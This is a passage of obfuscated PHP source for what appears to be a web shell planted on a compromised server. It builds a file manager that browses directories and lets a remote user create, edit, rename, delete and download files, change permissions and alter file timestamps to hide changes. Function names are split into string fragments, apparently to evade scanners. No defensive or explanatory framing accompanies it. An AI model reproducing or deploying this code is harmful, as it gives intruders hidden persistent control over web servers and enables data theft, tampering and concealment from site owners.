			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['c1eL']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['c1eL'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
			}
			echo '<form method="post">
			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
			<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
			<input type="hidden" name="pilih" value="ubahtanggal">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Fai"."led to Cha"."nge Da"."te !");
		}
	} else {
		$det = "da"."te";
		$ftm = "fi"."le"."mti"."me";
		$b = $det("d F Y H:i:s", $ftm($_POST['c1eL']));
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['c1eL'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
		}
		echo '<form method="post">
		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
		<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
		<input type="hidden" name="pilih" value="ubahtanggal">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_POST['c1eL']) && $_POST['pilih'] == "betax") {
	$nyolong = $_POST['c1eL'];
	if ($fxt($nyolong) && isset($nyolong)) {
		if ($ird($nyolong)) {
			betax($nyolong);
		} elseif ($idr($fl)) {
			red("That is Di"."rec"."tory, Not Fi"."le -_-");
		} else {
			red("Fi"."le is Not Re"."adab"."le !");
		}
	} else {
		red("Fi"."le Not Fo"."und !");
	}
} elseif (isset($_POST['c1eL']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['c1eL'];
        if (isset($_POST['buatfolder'])) {
            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
            if ($buatf == true) {
                green("Folder <b>".htmlspecialchars($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
                <input type="hidden" name="pilih" value="folder"></form>';
            } else {
                red("Failed to Create folder !");
                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
                <input type="hidden" name="pilih" value="folder"></form>';
            }
        } else {
            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['lok'.'nya'];
        if (isset($_POST['buatfi'.'le'])) {
            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                green("File <b>".htmlspecialchars($_POST['fi'.'lebaru'])."</b> Created !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="c1eL" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            } else {
                red("Failed to Create File !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="c1eL" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            }
        } else {
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="c1eL" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Na'.'me</center></td>
<td><center>Si'.'ze</center></td>
<td><center>Las'.'t Mo'.'dif'.'ied</center></td>
<td><center>Owner / Group</center></td>
<td><center>Pe'.'rmi'.'ss'.'ions</center></td>
<td><center>Op'.'tio'.'ns</center></td>
</tr>';

echo "<tr>";
$auutolkw = $srl($bsn($tokber), "", $tokber);
$auutolkw = $srl("//", "/", $auutolkw);
echo "<td><i class='fa fa-folder' style='color: #fbc000'></i> <a href=\"?c1eL=".$auutolkw."\">..</a></td>
<td><center>--</center></td>
<td><center>".fdt($auutolkw)."</center></td>
<td><center>".gor($auutolkw)." / ".ggr($auutolkw)."</center></td>
<td><center>";
if($isw($auutolkw)) echo '<font color="green">';
elseif(!$isr($auutolkw)) echo '<font color="red">';
echo statusnya($auutolkw);
if($isw($auutolkw) || !$isr($auutolkw)) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&c1eL=$tokber\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$coldo\">
<input type=\"hidden\" name=\"c1eL\" value=\"$tokber/$coldo\">
<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
</form></center>";
echo "</tr>";

foreach($tokbernya as $coldo){
	$auutol = $tokber."/".$coldo;
	$auutol = $srl("//", "/", $auutol);
	if(!$idi($auutol) || $coldo == '.' || $coldo == '..') continue;
	echo "<tr>";
	echo "<td><i class='fa fa-folder' style='color: #fbc000'></i> <a href=\"?c1eL=".$auutol."\">".$coldo."</a></td>
	<td><center>--</center></td>
	<td><center>".fdt($auutol)."</center></td>
	<td><center>".gor($auutol)." / ".ggr($auutol)."</center></td>
	<td><center>";
	if($isw($auutol)) echo '<font color="green">';
	elseif(!$isr($auutol)) echo '<font color="red">';
	echo statusnya($auutol);
	if($isw($auutol) || !$isr($auutol)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?pilihan&c1eL=$tokber\">
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$coldo\">
	<input type=\"hidden\" name=\"c1eL\" value=\"$tokber/$coldo\">
	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
$skd = "10"."24";
foreach($tokbernya as $dupir) {
	$juanda = $tokber."/".$dupir;
	if(!$ifi("$tokber/$dupir")) continue;
	$size = $fsz("$tokber/$dupir")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
	$size = $rd($size/$skd,2).' M'.'B';
} else {
	$size = $size.' K'.'B';
}

echo "<tr>
<td>".cfn($juanda)." <a href=\"?s3b4s=$tokber/$dupir&c1eL=$tokber\">$dupir</a></td>
<td><center>".$size."</center></td>
<td><center>".fdt($juanda)."</center></td>
<td><center>".gor($juanda)." / ".ggr($juanda)."</center></td>
<td><center>";
if($isw("$tokber/$dupir")) echo '<font color="green">';
elseif(!$isr("$tokber/$dupir")) echo '<font color="red">';
echo statusnya("$tokber/$dupir");
if($isw("$tokber/$dupir") || !$isr("$tokber/$dupir")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&c1eL=$tokber\">
<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='betax'><i class='fa fa-down"."load' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
<input type=\"hidden\" name=\"type\" value=\"fi"."le\">
<input type=\"hidden\" name=\"name\" value=\"$dupir\">
<input type=\"hidden\" name=\"c1eL\" value=\"$tokber/$dupir\">
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($fl){
	$a = "sub"."st"."r";
	$b = "s"."pri"."ntf";
	$c = "fil"."eper"."ms";
$izin = $a($b('%o', $c($fl)), -4);
return $izin;
}
?>